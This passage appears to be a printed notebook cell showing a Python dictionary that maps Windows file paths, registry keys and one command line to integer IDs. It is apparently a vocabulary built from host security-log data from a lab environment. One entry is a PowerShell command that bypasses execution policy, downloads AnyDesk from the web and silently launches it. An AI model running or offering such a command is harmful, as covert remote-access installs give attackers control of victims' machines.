       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 756,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ms\\\\.git': 757,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 758,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 759,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 760,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\tr\\\\*': 761,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\en_US\\\\*': 762,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\.git': 763,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\gl-ES\\\\.git': 764,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\bg': 765,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\def\\\\Code Cache\\\\js\\\\.git': 766,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group3\\\\*': 767,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\*': 768,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\lv\\\\.git': 769,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 770,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ja': 771,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\AC\\\\Temp': 772,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{1e87508d-89c2-42f0-8a7e-645a0f50ca58}\\\\PreCreate': 773,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\security_state\\\\.git': 774,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\AppData': 775,\n",
       " 'C:\\\\Users\\\\garypetty\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\misc': 776,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 777,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\Temp': 778,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\zh_TW\\\\.git': 779,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hi\\\\*': 780,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\*': 781,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-YE\\\\.git': 782,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\BackgroundTransferApi\\\\.git': 783,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\db\\\\.git': 784,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_metadata': 785,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 786,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\TempState\\\\*': 787,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-MA\\\\*': 788,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ca': 789,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs': 790,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\tmp\\\\.git': 791,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache': 792,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{E25B5812-BE88-4BD9-94B0-29233477B6C3}': 793,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.1.7_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 794,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-BZ\\\\.git': 795,\n",
       " 'C:\\\\Windows\\\\Temp\\\\MSASN1.dll': 796,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft Help\\\\.git': 797,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sv\\\\*': 798,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280811\\\\*': 799,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AppData': 800,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\fi\\\\.git': 801,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sv\\\\.git': 802,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\pl\\\\.git': 803,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{054FAE61-4DD8-4787-80B6-090220C4B700}\\\\Icon': 804,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\.git': 805,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\*': 806,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\RoamingState\\\\*': 807,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\Settings\\\\.git': 808,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{559D40A3-A036-40FA-AF61-84CB430A4D34}\\\\Icon': 809,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\AC\\\\Temp': 810,\n",
       " 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\Tablet PC\\\\': 811,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData\\\\*': 812,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\0fffa981-3a0e-41e3-9174-f37a60f68993\\\\index-dir\\\\.git': 813,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\TempState': 814,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Safety\\\\edge\\\\local\\\\*': 815,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\LocalState\\\\*': 816,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-SG\\\\.git': 817,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC': 818,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 819,\n",
       " 'C:\\\\Users\\\\dkelly\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\*': 820,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCookies\\\\DNTException': 821,\n",
       " 'C:\\\\Users\\\\james97\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10\\\\demos': 822,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 823,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationHints': 824,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\*': 825,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637680406057830000\\\\2\\\\*': 826,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\Temp': 827,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-VE\\\\.git': 828,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\gu': 829,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\is\\\\.git': 830,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ClientSidePhishing\\\\*': 831,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 832,\n",
       " 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\DisableFCM': 833,\n",
       " 'C:\\\\Users\\\\james97\\\\Documents\\\\*': 834,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\BudgetDatabase\\\\*': 835,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\LocalCache\\\\.git': 836,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Nurturing\\\\*': 837,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\el\\\\*': 838,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\*': 839,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\.git': 840,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 841,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\AC\\\\.git': 842,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\it\\\\.git': 843,\n",
       " 'C:\\\\Users\\\\bmoore\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD-ADFS\\\\*': 844,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\en_GB\\\\*': 845,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637849849811270000\\\\1\\\\*': 846,\n",
       " 'C:\\\\Users\\\\james97\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Linux': 847,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hy\\\\*': 848,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\pt-BR': 849,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\DeviceSearchCache': 850,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\fr': 851,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Network\\\\.git': 852,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\LocalState': 853,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\RoamingState\\\\*': 854,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\.git': 855,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 856,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\LocalLow\\\\Microsoft\\\\Internet Explorer\\\\EmieSiteList\\\\.git': 857,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\*': 858,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\MobilityExperience\\\\ImageCache': 859,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\LocalCache\\\\.git': 860,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Extension State': 861,\n",
       " 'C:\\\\Users\\\\wthornton\\\\Saved Games\\\\.git': 862,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\Desktop\\\\Blacksmith-master\\\\*': 863,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ur': 864,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AppData\\\\*': 865,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 866,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\r7js9xmv.default\\\\.git': 867,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\*': 868,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 869,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-CA\\\\*': 870,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6': 871,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sr': 872,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 873,\n",
       " '20190706_125803.xls': 874,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\de\\\\.git': 875,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 876,\n",
       " 'powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest -OutFile C:\\\\Users\\\\icampbell\\\\Desktop\\\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \\\\\"C:\\\\Users\\\\\\\\\\\\\" + icampbell + \\\\\"\\\\Desktop\\\\AnyDesk.exe\\\\\"; Start-Process $file1 /S;\"': 877,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\sr-Latn-RS\\\\*': 878,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\.git': 879,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\XboxLive\\\\*': 880,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 881,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy': 882,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-SN\\\\*': 883,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetHistory': 884,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.DesktopAppInstaller_1.17.10271.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities\\\\FileAssociations\\\\.txt': 885,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 886,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-IN': 887,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\.git': 888,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\RoamingState': 889,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\AutomaticDestinations\\\\*': 890,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC': 891,\n",
       " 'C:\\\\Users\\\\nsilva\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\dsc': 892,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\.git': 893,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC': 894,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\CloudStore\\\\*': 895,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\es\\\\*': 896,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\windows_ie_ac_001\\\\*': 897,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp': 898,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 899,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AppData': 900,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\TempState\\\\*': 901,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 902,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Network\\\\Connections\\\\Pbk\\\\_hiddenPbk': 903,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 904,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 905,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Roaming': 906,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\.git': 907,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\TempState\\\\*': 908,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\IRMProtectors\\\\.git': 909,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\Favicons\\\\.git': 910,\n",
